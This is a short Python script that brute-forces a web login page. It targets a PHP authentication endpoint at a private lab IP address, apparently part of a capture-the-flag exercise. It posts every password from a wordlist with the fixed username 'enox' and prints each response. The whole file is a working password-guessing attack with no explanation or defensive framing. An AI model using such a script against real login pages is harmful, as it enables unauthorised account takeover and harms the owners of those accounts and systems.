import requests

url = "http://10.10.28.253/sUp3r-s3cr3t/authenticate.php"

def login(username, password):
    r = requests.post(url, data = {
            "username": username,
            "password": password,
            "submit": "Login"
        })

    return r


with open("userid.txt", "r") as h:
    usernames = [line for line in h.read().split("\n") if line ]
with open("wordlist.txt", "r") as h:
    passwords = [line for line in h.read().split("\n") if line ] 

for password in passwords:
    response =  login("enox", password).text
    print(f"password {password}: {response}")
   
